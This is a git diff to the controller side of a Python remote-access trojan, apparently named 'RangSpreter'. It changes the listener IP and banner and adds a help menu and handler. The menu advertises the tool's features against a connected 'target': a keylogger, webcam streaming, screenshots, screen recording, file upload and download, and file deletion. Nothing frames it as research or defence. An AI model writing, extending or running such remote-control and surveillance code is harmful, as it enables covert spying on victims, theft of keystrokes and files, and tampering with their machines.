@@ -9,20 +9,20 @@ import threading
 
 init(autoreset=True)
 soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-soc.bind(('192.168.1.12', 5555))
+soc.bind(('192.168.1.24', 5555))
 print(Fore.GREEN + 'wait for connection ...')
 soc.listen(1)
 
 connection = soc.accept()
 _target = connection[0]
 ip = connection[0]
-print(_target)
 print(Fore.RED + """
     	░█▀▄░█▀█░█▀█░█▀▀░█▀▀░█▀█░█▀▄░█▀▀░▀█▀░█▀▀░█▀▄
 	░█▀▄░█▀█░█░█░█░█░▀▀█░█▀▀░█▀▄░█▀▀░░█░░█▀▀░█▀▄
 	░▀░▀░▀░▀░▀░▀░▀▀▀░▀▀▀░▀░░░▀░▀░▀▀▀░░▀░░▀▀▀░▀░▀
-    """ + Fore.CYAN + f'\n Nice! connected to {str(ip)}')
-
+    """ + Fore.CYAN + '\nNice! connected to:')
+print(Fore.CYAN + f"{_target}")
+print(Fore.CYAN + "Use h command to see options!")
 
 def data_accepted():
 	data = ''
@@ -89,7 +89,7 @@ def stream_cam():
 
 def convert_byte_record():
 	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	sock.bind(('192.168.1.12', 9995))
+	sock.bind(('192.168.1.24', 9995))
 	sock.listen(5)
 	connection = sock.accept()
 	tg = connection[0]
@@ -122,6 +122,30 @@ def convert_byte_record():
 def record():
 	t = threading.Thread(target=convert_byte_record)
 	t.start() #bro, i forgot to add () and that's make me search it for almost 40 minutes!
+
+def help():
+	print("""
+RangSpreter Options:
+wipe 		      clear rangspreter output (instead clear command)
+ul                    upload file to target
+dl                    download file from target
+exit, out             get out from target
+sl                    start keylogger (when you are start keylogger, you cant use any of those commands)
+rl                    read keylogger (dont use this command if you dont start keylogger/sl)
+stl                   stop keylogger (dont use this command if you dont start keylogger/sl)
+wcam                  start web camera (use escape button to stop webcam)
+sh                    screenshot target monitor
+sr		      (NEW FEATURE) screen recording
+h		      (NEW FEATURE) show options
+
+Default options:
+mkdir                 make directory/folder
+rmdir                 remove directory/folder
+del                   delete file
+ipconfig              see target IP details
+whoami                who you are in the target
+move 		      move file to other directory
+		""")
 
 def communicate_shell():
 	n = 0
@@ -163,6 +187,8 @@ def communicate_shell():
 			file.close()
 		elif command == 'sr': #new screen recording feature
 			record()
+		elif command == "h":
+			help()
 		else:
 			done = data_accepted()
 			print(done)
